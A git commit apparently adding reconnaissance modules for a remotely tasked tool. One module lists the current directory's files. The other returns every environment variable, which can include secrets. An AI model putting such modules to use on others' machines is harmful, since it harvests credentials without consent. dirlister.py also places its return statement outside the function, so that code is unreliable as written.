40711f03e208d0cf7b4457366b43231f9b759f34
Yamamoto <moe-hana@users.noreply.github.com>
2019-04-29 09:05:27 +0900

    Adding new modules.

---
+++ modules/dirlister.py
@@ -0,0 +1,10 @@
+# This is code that returns all files name.
+
+import os
+
+def run(**arg):
+	
+	print("[*] In dirlister module.")
+	files = os.listdir(".")
+
+return str(files)
---
+++ modules/environment.py
@@ -0,0 +1,9 @@
+# This is a code that environment variable.
+
+import os
+
+def run(**args):
+
+	print("[*] In environment modules")
+	
+	return str(os.environ)
